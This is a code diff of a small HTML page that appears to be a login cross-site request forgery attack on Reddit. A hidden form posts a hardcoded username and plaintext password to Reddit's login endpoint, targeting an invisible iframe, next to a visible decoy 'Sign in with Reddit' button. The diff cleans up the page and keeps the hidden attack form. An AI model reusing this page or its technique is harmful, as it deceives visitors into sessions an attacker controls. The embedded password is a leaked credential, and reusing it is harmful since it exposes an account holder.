@@ -1,14 +1,13 @@
 <div>
   <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js"></script>
-  <script src="http://malsup.github.com/jquery.form.js"></script>
   <center>
-    <form method="POST" target="target" style="visibility:hidden" action="https://www.reddit.com/post/login" name="form-type" value="hidden">
+    <form method="post" target="target" style="display:none" action="https://www.reddit.com/post/login">
       <input type="hidden" name="user" value="dagny15"/>
       <input type="hidden" name="passwd" value="Johngalt15*" />
       <input type="submit" value="Sign in with Reddit" id="hiddenSubmit"/>
     </form>
-    <form method="POST" name="form-type" value="visible">
-      <input type="submit" value="Sign in with Reddit" style="position: relative;top: -34px;"/>
+    <form method="post">
+      <input type="submit" value="Sign in with Reddit"/>
     </form>
     <iframe name="target" style="display:none"></iframe>
   </center>
